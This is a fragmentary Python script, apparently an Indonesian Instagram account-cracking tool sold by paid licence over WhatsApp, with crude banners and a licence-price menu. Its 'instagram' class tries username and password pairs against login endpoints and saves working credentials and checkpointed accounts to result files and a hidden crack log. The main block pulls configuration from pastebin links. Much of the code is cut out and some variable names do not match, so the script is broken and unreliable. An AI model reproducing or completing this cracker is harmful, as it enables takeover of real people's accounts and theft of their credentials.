...
#Coder By LuthfiXD
#Githuber LuthfiXD Ari Marshello
#LuthfiXD><
...
\______| \______/ \__|  \__|
                          ...
                          [bold white]SEDANG MENUJU KONTOL [bold red]Leonzz XD [bold blue]Github : LeonzzXD""",width=100,padding=(0,8),title=f"[bold white]LUTHFI XD",style=f"bold green"))        
...
luci.append(panel(f"""[bold white][[bold green]01[bold white]] 1 Day 20K\n[bold white][[bold green]02[bold white]] 2 Day 40K\n[bold white][[bold green]03[bold white]] 7 Day 50K [DISKON]""",width=50,padding=(0,8),style=f"bold green"))
luci.append(panel(f"""[bold white][[bold green]04[bold white]] 1 Bulan 130K\n[bold white][[bold green]05[bold white]] Open Source 250K\n[bold white][[bold green]00[bold white]] Keluar Tod""",width=50,padding=(0,8),style=f"bold green"))
console.print(Columns(luci))	
luciverganteng_banget = input(f'\n\x1b[1;92mâž¢ â€¢ \x1b[1;97mSilahkan Pilih Guys : ')
loading()
os.system('clear')
if luciverganteng_banget in ['1']:
	os.system("xdg-open https://wa.me/+6285240808671?text=Assalamualaikum+bang+gua+mau+beli+Lisensi+1+Day+20K")
elif luciverganteng_banget in ['2']:
	os.system("xdg-open https://wa.me/+6285240808671?text=Assalamualaikum+bang+gua+mau+beli+Lisensi+2+Day+40K")
elif leonzzganteng_banget in ['3']:
	os.system("xdg-open https://wa.me/+6285240808671?text=Assalamualaikum+bang+gua+mau+beli+Lisensi+7+Day+50K+yang+diskon")
elif leonzzganteng_banget in ['4']:
	os.system("xdg-open https://wa.me/+6285240808671?text=Assalamualaikum+bang+gua+mau+beli+Lisensi+1+Bulan+130K")
elif leonzzganteng_banget in ['5']:
	os.system("xdg-open https://wa.me/+6285240808671?text=Assalamualaikum+bang+gua+mau+beli+Lisensi+open+source+250K")
elif leonzzganteng_banget in ['0']:
	exit()
loading()
os.system('clear')
banner()	
Password = "bangleonzzxd"  #--> Data Req Api key --> open_kt(life)("https://github.com/loser-401/loser/blob/main/paid.txt")
...
\__|  \__| \______/ \_______/ \________|   \__|   ''')
def loadinglisen():
    animation = ["[\x1b[1;91mâ– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]","[\x1b[1;92mâ– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;93mâ– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;94mâ– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;95mâ– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;96mâ– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡]", "[\x1b[1;97mâ– â– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡]", "[\x1b[1;98mâ– â– â– â– â– â– â– â– \x1b[0mâ–¡â–¡]", "[\x1b[1;99mâ– â– â– â– â– â– â– â– â– \x1b[0mâ–¡]", "[\x1b[1;910mâ– â– â– â– â– â– â– â– â– â– \x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
...
class instagram:
 ...
 {SE}â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯{SE} â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯''',title=f"[[white] Cek Hasil [/]]",width=80,style=f"{color_table}"))
	def ifo(self):
		urut = []
		urut.append(Panel(f' [white][[blue]01[white]]. Method Api V1[white] [[green]recommend[white]]\n [white][[blue]02[white]]. Method Api V2[white] [[green]recommend[white]]\n [white][[blue]03[white]]. Method Api V3[white] [[green]recommend[white]]',width=40,title=f"[white]Method Api",style=f"{color_table}"))
				...
				try:
					...
					if "logged_in_user" in str(ncek) or "sessionid" in ses.cookies.get_dict() or "userId" in str(ncek):
						...
						try:
							...
							print('\n')
							cetak(nel(pepekXD,style='',title='\r[bold green] ð‹ðˆð•ð„ [bold green]'))
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							open('.logCrack','a').write(f'{H}â•­({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}â•°{H}{respon.text}\n')
							break
						except:
						...
						print('\n')
						cetak(nel(pepekXD,style='', title='\r[bold yellow] ð‚ð„ðŠððŽðˆNð“ [bold yellow]'))
						open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
						checkpoint.append(user)
						open('.logCrack','a').write(f'{K}â•­({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}â•°{K}{respon.text}\n')
						break
...
if __name__=='__main__':
	...
	try:
		with requests.Session() as ses:
	         ko = ses.get('https://pastebin.com/raw/6tPx6jKc').json()
	         HARIS.update(ko)
	         ki = ses.get('https://pastebin.com/raw/HRjf3ctx').json()
	         HARIS1.update(ki)
	         os.system("git pull")
	         login_kamu()
	except Exception as e:
